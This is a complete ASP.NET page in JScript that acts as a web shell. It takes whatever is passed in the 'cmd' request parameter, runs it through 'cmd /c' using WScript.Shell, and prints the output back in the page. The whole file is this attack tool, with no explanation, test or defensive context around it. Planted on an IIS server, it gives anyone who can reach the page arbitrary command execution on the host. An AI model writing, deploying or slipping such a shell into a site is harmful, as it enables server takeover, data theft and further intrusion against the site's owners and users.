<%@ Page Language="JScript" %>
<%
function runCommand(command) {
    var shell = new ActiveXObject("WScript.Shell");
    var exec = shell.Exec(command);
    var output = "";

    while (!exec.StdOut.AtEndOfStream) {
        output += exec.StdOut.ReadLine() + "\n";
    }

    return output;
}

var result = runCommand("cmd /c " + Request.Item["cmd"]);
Response.Write("<pre>" + result + "</pre>");
%>
